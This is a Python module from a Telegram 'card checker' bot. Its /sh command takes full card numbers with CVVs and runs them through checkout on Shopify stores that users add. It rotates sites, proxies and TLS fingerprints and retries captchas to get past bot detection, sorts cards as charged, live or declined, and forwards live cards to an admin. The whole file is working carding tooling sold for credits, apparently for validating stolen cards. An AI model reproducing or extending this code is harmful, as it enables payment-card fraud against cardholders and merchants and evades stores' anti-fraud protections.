"""
Professional Shopify Single Card Checker
Handles /sh and /slf commands for checking cards on user's saved site.
Uses site rotation for retry logic on captcha/errors.
"""

import re
import json
import os
import asyncio
from time import time
from datetime import datetime

from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ParseMode, ChatType, ChatAction

from BOT.helper.start import load_users
from BOT.helper.antispam import can_run_command
from BOT.gc.credit import has_credits, deduct_credit
from BOT.Charge.Shopify.slf.api import autoshopify, autoshopify_with_captcha_retry
from BOT.Charge.Shopify.tls_session import TLSAsyncSession
from BOT.Charge.Shopify.bulletproof_session import BulletproofSession
from BOT.Charge.Shopify.slf.site_manager import SiteRotator, get_user_sites, get_primary_site
from BOT.helper.admin_forward import forward_success_card_to_admin

# Try to import BIN lookup
try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return None

# Maximum retries with site rotation - Professional 3 site rotation with 3 retries per site
MAX_SITE_RETRIES = 3  # Maximum site rotations (3 sites total: primary + 2 rotations)
# Exactly 3 attempts per site before rotating to next site
CHECKS_PER_SITE = 3
MAX_SITE_CHANGES = 2  # Rotate 2 more times after primary (3 sites total)
# Delay (s) between attempts on same site; between site rotations. Minimal, 429-safe.
DELAY_BETWEEN_ATTEMPTS = 0.15
DELAY_BETWEEN_SITES = 0.1
# Captcha retries per attempt (TLS fingerprint rotation)
CAPTCHA_RETRIES_PER_ATTEMPT = 3
# Mass checks: sequential only. No parallel threads to avoid HTTP 429 / captcha.
SH_CONCURRENT_THREADS = 1
# Delay (s) between each card in /tsh, /msh. Sequential = no burst; minimal delay.
MASS_DELAY_BETWEEN_CARDS = 0.2


def _is_valid_shopify_response(rotator: SiteRotator, resp: str) -> bool:
    """True if proper card response (charged/CCN/declined). False for captcha/site/HTTP/JSON errors."""
    if not resp:
        return False
    if rotator.is_real_response(resp):
        return True
    if rotator.should_retry(resp):
        return False
    u = resp.upper()
    invalid = (
        "CAPTCHA" in u or "HCAPTCHA" in u or "SITE_" in u or "SITE DEAD" in u or "CART_" in u or "SESSION_" in u
        or "ERROR" in u or "TIMEOUT" in u or "CONNECTION" in u or "JSON" in u or "HTTP" in u
        or "CHECKOUT_" in u or "NEGOTIATE_" in u or "DEAD" in u
        or "RECEIPT_EMPTY" in u or "SUBMIT_" in u
    )
    return not invalid


def _ordered_sites_for_rotation(user_id: str):
    """Return sites for /sh rotation: primary first, then rest. Active only."""
    sites = get_user_sites(user_id)
    sites = [s for s in sites if s.get("active", True)]
    if not sites:
        return []
    primary = get_primary_site(user_id)
    p_url = (primary.get("url") or "").lower().rstrip("/") if primary else ""
    if not p_url:
        return sites
    for i, s in enumerate(sites):
        if (s.get("url") or "").lower().rstrip("/") == p_url:
            return [sites[i]] + [x for j, x in enumerate(sites) if j != i]
    return sites


async def check_card_all_sites_parallel(
    user_id: str,
    fullcc: str,
    proxy,
    progress_callback=None,
) -> tuple:
    """
    /sh site rotation: exactly 3 attempts per site, then rotate to next.
    Rotate up to 3 times (4 sites total: primary + 3 rotations).
    Return immediately on good real response (charged/CCN/declined). Otherwise
    exhaust 3 attempts per site, then switch if more sites available.
    progress_callback: optional async (gateway, site_idx, sites_total, site_change) -> None.
    Returns (result_dict, retry_count).
    """
    ordered = _ordered_sites_for_rotation(user_id)
    if not ordered:
        return (
            {"Response": "NO_SITES_CONFIGURED", "Status": False, "Gateway": "Unknown", "Price": "0.00", "cc": fullcc},
            0,
        )

    rotator = SiteRotator(user_id, max_retries=MAX_SITE_RETRIES)
    retry_count = 0
    last_res = None
    last_gate = "Unknown"
    # Try exactly 3 sites: primary + 2 rotations
    sites_to_try = ordered[:3] if len(ordered) >= 3 else ordered

    async def check_one(site_info: dict):
        url = site_info.get("url", "")
        gate = site_info.get("gateway", "Shopify")
        try:
            # Use Playwright for /sh command - most bulletproof requests
            async with BulletproofSession(timeout_seconds=90, proxy=proxy, use_playwright=True) as session:
                res = await autoshopify_with_captcha_retry(
                    url, fullcc, session, max_captcha_retries=CAPTCHA_RETRIES_PER_ATTEMPT, proxy=proxy
                )
            return (gate, res)
        except Exception as e:
            return (gate, {"Response": f"ERROR: {str(e)[:50]}", "Status": False, "Gateway": gate, "Price": "0.00", "cc": fullcc})

    for site_idx, site_info in enumerate(sites_to_try):
        gate = site_info.get("gateway", "Shopify")
        site_change = site_idx > 0
        if progress_callback:
            try:
                await progress_callback(gate, site_idx + 1, len(sites_to_try), site_change)
            except Exception:
                pass

        for attempt in range(CHECKS_PER_SITE):
            g, res = await check_one(site_info)
            gate = g
            if res:
                res["Gateway"] = gate
            _log_check_to_terminal(gate, res, fullcc)
            resp = str((res or {}).get("Response", ""))
            last_res, last_gate = res, gate

            if _is_valid_shopify_response(rotator, resp):
                res["Gateway"] = gate
                return (res, retry_count)

            if attempt < CHECKS_PER_SITE - 1:
                retry_count += 1
                await asyncio.sleep(DELAY_BETWEEN_ATTEMPTS)

        if site_idx < len(sites_to_try) - 1:
            await asyncio.sleep(DELAY_BETWEEN_SITES)

    if last_res is not None:
        last_res["Gateway"] = last_gate
        return (last_res, retry_count)
    return (
        {"Response": "UNKNOWN", "Status": False, "Gateway": "Unknown", "Price": "0.00", "cc": fullcc},
        retry_count,
    )


def _log_check_to_terminal(gate: str, res: dict, fullcc: str) -> None:
    """Print one check result to terminal (Gateway, Price, ReceiptId, Response, Status, cc)."""
    r = res or {}
    gate_raw = r.get("Gateway") or gate or "Unknown"
    gate_display = "Shopify Normal" if (not gate_raw or gate_raw == "Unknown" or gate_raw == "Normal") else (gate_raw if "Shopify" in str(gate_raw) else f"Shopify {gate_raw}")
    if "$" in str(gate_display):
        gate_display = re.sub(r"\s*\$\s*[\d.]+\s*$", "", str(gate_display)).strip() or "Shopify Normal"
    price = r.get("Price", "0.00")
    rid = r.get("ReceiptId")
    resp = r.get("Response", "UNKNOWN")
    status = r.get("Status", False)
    cc = r.get("cc", fullcc)
    lines = [f"Gateway: {gate_display}", f"Price: {price}"]
    if rid:
        lines.append(f"ReceiptId: {rid}")
    lines.append(f"Response: {resp} Status: {str(status).lower()}")
    if cc:
        lines.append(f"cc: {cc}")
    print("\n".join(lines))
    print()


def extract_card(text: str):
    """Extract card details from text in format cc|mm|yy|cvv."""
    match = re.search(r'(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', text)
    if match:
        return match.groups()
    return None


def determine_status(response: str) -> tuple:
    """
    Determine status category from response.
    Returns (status_text, header, is_live)
    
    Categories:
    - CHARGED: Payment went through successfully
    - CCN LIVE: Card is valid but CVV/Address/3DS issue (can be used with correct CVV)
    - DECLINED: Card is dead/blocked/expired
    - ERROR: System/Site errors, not card-related
    """
    response_upper = str(response).upper()
    
    # Charged/Success - Payment completed
    if any(x in response_upper for x in [
        "ORDER_PLACED", "ORDER_CONFIRMED", "THANK_YOU", "SUCCESS", "CHARGED", 
        "PAYMENT_RECEIVED", "COMPLETE"
    ]):
        return "Charged 💎", "CHARGED", True
    
    # Site/System Errors - These are NOT card issues, retry with different site or later
    if any(x in response_upper for x in [
        # Captcha/Bot detection
        "CAPTCHA", "HCAPTCHA", "RECAPTCHA", "CHALLENGE", "VERIFY",
        # Site errors
        "SITE_EMPTY", "SITE_HTML", "SITE_CAPTCHA", "SITE_HTTP", "SITE_CONNECTION",
        "SITE_NO_PRODUCTS", "SITE_PRODUCTS_EMPTY", "SITE_INVALID_JSON", "SITE_EMPTY_JSON",
        # Cart/Session errors
        "CART_ERROR", "CART_HTML", "CART_INVALID", "CART_CREATION",
        "SESSION_ERROR", "SESSION_ID", "SESSION_INVALID",
        # Checkout/Negotiate errors
        "CHECKOUT_", "NEGOTIATE_",
        # Other system errors
        "ERROR", "TIMEOUT", "EMPTY", "DEAD", "CONNECTION", "RATE_LIMIT",
        "BLOCKED", "PROXY", "NO_AVAILABLE_PRODUCTS", "BUILD",
        "RECEIPT_EMPTY", "SUBMIT_INVALID_JSON", "SUBMIT_NO_RESPONSE",
        # Tax and delivery issues
        "TAX_ERROR", "DELIVERY_ERROR", "SHIPPING_ERROR"
    ]):
        return "Error ⚠️", "ERROR", False
    
    # CCN/Live (CVV/Address issues but card NUMBER is valid)
    # These indicate the card exists and is active, just wrong CVV/address
    if any(x in response_upper for x in [
        "3DS", "3D_SECURE", "AUTHENTICATION_REQUIRED", "INCORRECT_CVC", "INVALID_CVC", 
        "INCORRECT_ADDRESS", "INCORRECT_ZIP", "INCORRECT_PIN", "MISMATCHED_BILLING",
        "MISMATCHED_ZIP", "MISMATCHED_PIN", "MISMATCHED_BILL", "CVV_MISMATCH",
        "INSUFFICIENT_FUNDS"  # Card is valid but no funds
    ]):
        return "Approved ✅", "CCN LIVE", True
    
    # Declined - Card is dead/blocked/stolen/expired/invalid
    if any(x in response_upper for x in [
        "CARD_DECLINED", "DECLINED", "GENERIC_DECLINE", "DO_NOT_HONOR",
        "INCORRECT_NUMBER", "INVALID_NUMBER", "EXPIRED", "NOT_SUPPORTED", 
        "LOST", "STOLEN", "PICKUP", "RESTRICTED", "SECURITY_VIOLATION",
        "FRAUD", "FRAUDULENT", "INVALID_ACCOUNT", "CARD_NOT_SUPPORTED",
        "TRY_AGAIN", "PROCESSING_ERROR", "NO_SUCH_CARD", "LIMIT_EXCEEDED",
        "REVOKED", "SERVICE_NOT_ALLOWED", "RISKY"
    ]):
        return "Declined ❌", "DECLINED", False
    
    # Default to declined for unknown responses
    return "Declined ❌", "RESULT", False


def format_response(fullcc: str, result: dict, user_info: dict, time_taken: float, retry_count: int = 0, has_proxy: bool = False) -> str:
    """Format the checkout response. Always use real checkout total for price."""
    parts = fullcc.split("|")
    cc = parts[0] if len(parts) > 0 else "Unknown"
    
    response = result.get("Response", "UNKNOWN")
    price = result.get("Price", "0.00")
    receipt_id = result.get("ReceiptId", None)
    try:
        pv = float(price)
        price_str = f"{pv:.2f}" if pv != int(pv) else str(int(pv))
    except (TypeError, ValueError):
        price_str = str(price) if price else "0.00"
    gateway_display = f"Shopify Normal ${price_str}"
    
    status_text, header, is_live = determine_status(response)
    
    # BIN lookup
    bin_data = get_bin_details(cc[:6]) if get_bin_details else None
    
    if bin_data:
        bin_number = bin_data.get('bin', cc[:6])
        vendor = bin_data.get('vendor', 'N/A')
        card_type = bin_data.get('type', 'N/A')
        level = bin_data.get('level', 'N/A')
        bank = bin_data.get('bank', 'N/A')
        country = bin_data.get('country', 'N/A')
        country_flag = bin_data.get('flag', '🏳️')
    else:
        bin_number = cc[:6]
        vendor = "N/A"
        card_type = "N/A"
        level = "N/A"
        bank = "N/A"
        country = "N/A"
        country_flag = "🏳️"
    
    # Build optional lines
    bill_line = ""
    if receipt_id:
        bill_line = f"\n<b>[•] Bill:</b> <code>{receipt_id}</code>"
    
    retry_line = f"\n<b>[•] Retries:</b> <code>{retry_count}</code>"
    
    proxy_status = "Live ⚡️" if has_proxy else "None"
    
    # Build message in original format
    return f"""<b>[#Shopify] | {header}</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card:</b> <code>{fullcc}</code>
<b>[•] Gateway:</b> <code>{gateway_display}</code>
<b>[•] Status:</b> <code>{status_text}</code>
<b>[•] Response:</b> <code>{response}</code>{retry_line}{bill_line}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] BIN:</b> <code>{bin_number}</code>
<b>[+] Info:</b> <code>{vendor} - {card_type} - {level}</code>
<b>[+] Bank:</b> <code>{bank}</code> 🏦
<b>[+] Country:</b> <code>{country}</code> {country_flag}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By:</b> {user_info['profile']} [<code>{user_info['plan']} {user_info['badge']}</code>]
<b>[ϟ] Dev:</b> <a href="https://t.me/Chr1shtopher">Chr1shtopher</a>
━━━━━━━━━━━━━━━
<b>[ﾒ] Time:</b> <code>{time_taken}s</code> | <b>Proxy:</b> <code>{proxy_status}</code>"""


async def check_group_command(message: Message) -> bool:
    """
    Check if command is used in group and guide user to use in private.
    Returns True if command should continue, False if it was blocked.
    """
    if message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
        # Extract command name
        command = message.text.split()[0].replace("/", "").replace(".", "").replace("$", "").lower()
        
        if command in PRIVATE_ONLY_COMMANDS:
            # Get bot username for link
            try:
                bot_info = await message._client.get_me()
                bot_username = bot_info.username
                bot_link = f"https://t.me/{bot_username}"
            except:
                bot_link = "https://t.me/YOUR_BOT"
            
            await message.reply(
                f"""<pre>🔒 Private Command</pre>
━━━━━━━━━━━━━━━
<b>This command only works in private chat.</b>

<b>How to use:</b>
1️⃣ Click the button below to open private chat
2️⃣ Use <code>/{command}</code> command there

<b>Why private?</b>
• 🔐 Protects your card data
• ⚡ Faster response times
• 📊 Personal site management
━━━━━━━━━━━━━━━
<i>Your data security is our priority!</i>""",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📱 Open Private Chat", url=bot_link)],
                    [InlineKeyboardButton("📖 Help", callback_data="show_help")]
                ])
            )
            return False
    return True


@Client.on_message(filters.command(["sh", "slf"]) | filters.regex(r"^\.sh(\s|$)") | filters.regex(r"^\.slf(\s|$)"))
async def handle_sh_command(client: Client, message: Message):
    """
    Handle /sh and /slf commands for Shopify card checking.
    Uses site rotation for retry logic on captcha/errors.
    """
    try:
        if not message.from_user:
            return
        
        user_id = str(message.from_user.id)
        users = load_users()
        
        # Check registration
        if user_id not in users:
            return await message.reply(
                """<pre>Access Denied 🚫</pre>
<b>You must register first using</b> <code>/register</code> <b>command.</b>""",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        
        # Check credits
        if not has_credits(user_id):
            return await message.reply(
                """<pre>Notification ❗️</pre>
<b>Message:</b> <code>You Have Insufficient Credits</code>
━━━━━━━━━━━━━
<b>Type <code>/buy</code> to get Credits.</b>""",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        
        # Initialize site rotator
        rotator = SiteRotator(user_id, max_retries=MAX_SITE_RETRIES)
        
        if not rotator.has_sites():
            return await message.reply(
                """<pre>Site Not Found ⚠️</pre>
<b>Error:</b> <code>Please set a site first</code>

Use <code>/addurl https://store.com</code> to add a Shopify site.
Use <code>/txturl site1.com site2.com</code> for multiple sites.""",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        
        # Extract card
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            return await message.reply(
                """<pre>Card Not Found ❌</pre>
<b>Error:</b> <code>No card found in your input</code>

<b>Usage:</b> <code>/sh cc|mm|yy|cvv</code>
<b>Example:</b> <code>/sh 4111111111111111|12|2025|123</code>""",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        
        extracted = extract_card(target_text)
        if not extracted:
            return await message.reply(
                """<pre>Invalid Format ❌</pre>
<b>Error:</b> <code>Card format is incorrect</code>

<b>Format:</b> <code>cc|mm|yy|cvv</code> or <code>cc|mm|yyyy|cvv</code>
<b>Example:</b> <code>/sh 4111111111111111|12|25|123</code>""",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        
        # Antispam check
        allowed, wait_time = can_run_command(user_id, users)
        if not allowed:
            return await message.reply(
                f"""<pre>Antispam Detected ⚠️</pre>
<b>Message:</b> <code>Please wait before checking again</code>
<b>Try again in:</b> <code>{wait_time}s</code>""",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        
        # Prepare card
        card_num, mm, yy, cvv = extracted
        fullcc = f"{card_num}|{mm}|{yy}|{cvv}"
        
        # Get user info
        user_data = users.get(user_id, {})
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎟️")
        profile = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
        
        user_info = {"profile": profile, "plan": plan, "badge": badge}
        
        start_time = time()
        
        # Get user's proxy - REQUIRED for Shopify checks
        try:
            from BOT.tools.proxy import get_rotating_proxy
            user_proxy = get_rotating_proxy(int(user_id))
        except:
            user_proxy = None
        
        # Check if proxy is configured - REQUIRED
        if not user_proxy:
            return await message.reply(
                """<pre>Proxy Required 🔐</pre>
━━━━━━━━━━━━━━━
<b>You haven't configured a proxy yet.</b>

<b>Proxy is required for:</b>
• Avoiding rate limits
• Better success rates
• Secure checking

<b>How to set up:</b>
<code>/setpx ip:port:user:pass</code>

<b>Example:</b>
<code>/setpx 192.168.1.1:8080:user:pass</code>
━━━━━━━━━━━━━━━
<i>Set your proxy in private chat first!</i>""",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        
        has_proxy = True

        ordered = _ordered_sites_for_rotation(user_id)
        # Try exactly 3 sites: primary + 2 rotations
        sites_to_try = ordered[:3] if len(ordered) >= 3 else ordered
        sites_total = len(sites_to_try)
        first_gateway = sites_to_try[0].get("gateway", "Shopify") if sites_to_try else "Shopify"
        if first_gateway == "Shopify" or not first_gateway:
            first_gateway = "Shopify Normal"

        progress = {"gateway": first_gateway, "site": 1, "sites_total": sites_total, "site_change": False}

        async def on_progress(gateway: str, site_idx: int, total: int, site_change: bool):
            g = gateway if (gateway and gateway != "Shopify" and "$" in str(gateway)) else "Shopify Normal"
            progress["gateway"] = g
            progress["site"] = site_idx
            progress["sites_total"] = total
            progress["site_change"] = site_change

        loading_msg = await message.reply(
            f"""<pre>◐ Checking...</pre>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>• Card:</b> <code>{fullcc}</code>
<b>• Gate:</b> <code>{progress["gateway"]}</code>
<b>• Site:</b> <code>1/{sites_total}</code>
<b>• Status:</b> <i>◐ Processing...</i>""",
            reply_to_message_id=message.id,
            parse_mode=ParseMode.HTML
        )

        spinners = ("◐", "◓", "◑", "◒")
        SPINNER_INTERVAL = 1.0

        async def spinner_loop():
            i = 0
            last_edit = (None, None, None, None)
            while True:
                try:
                    g = progress.get("gateway", "Shopify")
                    s = progress.get("site", 1)
                    t = progress.get("sites_total", 1)
                    ch = progress.get("site_change", False)
                    key = (g, s, t, ch)
                    if key != last_edit:
                        last_edit = key
                        rot = " ↑ Rotated" if ch else ""
                        await loading_msg.edit(
                            f"""<pre>{spinners[i % 4]} Checking...</pre>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>• Card:</b> <code>{fullcc}</code>
<b>• Gate:</b> <code>{g}</code>
<b>• Site:</b> <code>{s}/{t}</code>{rot}
<b>• Status:</b> <i>{spinners[i % 4]} Processing...</i>""",
                            parse_mode=ParseMode.HTML,
                        )
                except Exception:
                    pass
                i += 1
                await asyncio.sleep(SPINNER_INTERVAL)

        async def typing_loop():
            while True:
                try:
                    await client.send_chat_action(message.chat.id, ChatAction.TYPING)
                except Exception:
                    pass
                await asyncio.sleep(3)

        spinner_task = asyncio.create_task(spinner_loop())
        typing_task = asyncio.create_task(typing_loop())

        try:
            result, retry_count = await check_card_all_sites_parallel(
                user_id, fullcc, user_proxy, progress_callback=on_progress
            )
        finally:
            spinner_task.cancel()
            typing_task.cancel()
            try:
                await spinner_task
            except asyncio.CancelledError:
                pass
            try:
                await typing_task
            except asyncio.CancelledError:
                pass

        if result is None:
            result = {"Response": "UNKNOWN", "Status": False, "Gateway": "Unknown", "Price": "0.00"}

        time_taken = round(time() - start_time, 2)
        final_message = format_response(fullcc, result, user_info, time_taken, retry_count, has_proxy)
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Support", url="https://t.me/Chr1shtopher"),
                InlineKeyboardButton("Plans", callback_data="plans_info")
            ]
        ])
        await loading_msg.edit(
            final_message,
            reply_markup=buttons,
            disable_web_page_preview=True,
            parse_mode=ParseMode.HTML
        )
        
        # Forward success card to admin if approved/charged
        response = result.get("Response", "UNKNOWN")
        status_text, header, is_live = determine_status(response)
        if is_live:  # Charged or Approved
            price = result.get("Price", "0.00")
            receipt_id = result.get("ReceiptId")
            gateway_display = f"Shopify Normal ${price}"
            
            # Get BIN info
            cc = fullcc.split("|")[0] if "|" in fullcc else fullcc
            bin_data = get_bin_details(cc[:6]) if get_bin_details else None
            if bin_data:
                bin_info = f"{bin_data.get('vendor', 'N/A')} - {bin_data.get('type', 'N/A')} - {bin_data.get('level', 'N/A')}"
                bank = bin_data.get('bank', 'N/A')
                country = f"{bin_data.get('country', 'N/A')} {bin_data.get('flag', '')}"
            else:
                bin_info = bank = country = "N/A"
            
            await forward_success_card_to_admin(
                client=client,
                card_data=fullcc,
                status=status_text,
                response=response,
                gateway=gateway_display,
                price=price,
                checked_by=user_info['profile'],
                bin_info=bin_info,
                bank=bank,
                country=country,
                retries=retry_count,
                receipt_id=receipt_id,
                time_taken=time_taken
            )
        
        # Deduct credit
        success, msg = deduct_credit(user_id)
        if not success:
            print(f"Credit deduction failed for user {user_id}")
        
    except Exception as e:
        print(f"Error in /sh command: {e}")
        import traceback
        traceback.print_exc()
        try:
            await message.reply(
                f"<pre>Error Occurred ⚠️</pre>\n<code>{str(e)[:100]}</code>",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        except:
            pass


# Callback handlers for buttons
@Client.on_callback_query(filters.regex("^help_addurl$"))
async def help_addurl_callback(client, callback_query):
    """Show help for adding URL."""
    await callback_query.answer()
    await callback_query.message.reply(
        """<pre>📖 How to Add Shopify Site</pre>
━━━━━━━━━━━━━━━
<b>Step 1:</b> Find a Shopify store URL
<b>Step 2:</b> Use the command:

<code>/addurl https://store.myshopify.com</code>

<b>The bot will:</b>
• ✅ Validate the site
• ✅ Find cheapest product
• ✅ Detect payment gateway
• ✅ Save it for your checks

<b>After adding, use:</b>
<code>/sh cc|mm|yy|cvv</code>
━━━━━━━━━━━━━━━""",
        parse_mode=ParseMode.HTML
    )


@Client.on_callback_query(filters.regex("^show_help$"))
async def show_help_callback(client, callback_query):
    """Show general help."""
    await callback_query.answer("Opening help menu...")
    await callback_query.message.reply(
        """<pre>📖 Bot Commands Help</pre>
━━━━━━━━━━━━━━━
<b>Shopify Commands:</b>
• <code>/addurl</code> - Add Shopify site
• <code>/mysite</code> - View your site
• <code>/sh</code> - Check card on your site
• <code>/msh</code> - Mass check cards

<b>Stripe Commands:</b>
• <code>/st</code> - Stripe $20 charge
• <code>/au</code> - Stripe auth check

<b>Other Commands:</b>
• <code>/bin</code> - BIN lookup
• <code>/fake</code> - Generate fake info
• <code>/gen</code> - Generate cards
━━━━━━━━━━━━━━━""",
        parse_mode=ParseMode.HTML
    )


@Client.on_callback_query(filters.regex("^charged_info$"))
async def charged_info_callback(client, callback_query):
    """Show info about charged card."""
    await callback_query.answer(
        "💎 Card was successfully charged! The payment went through.",
        show_alert=True
    )


@Client.on_callback_query(filters.regex("^ccn_info$"))
async def ccn_info_callback(client, callback_query):
    """Show info about CCN live card."""
    await callback_query.answer(
        "✅ Card is LIVE! CVV/Address issue but card number is valid.",
        show_alert=True
    )


@Client.on_callback_query(filters.regex("^try_another$"))
async def try_another_callback(client, callback_query):
    """Show how to try another card."""
    await callback_query.answer(
        "Use /sh cc|mm|yy|cvv with a different card",
        show_alert=True
    )
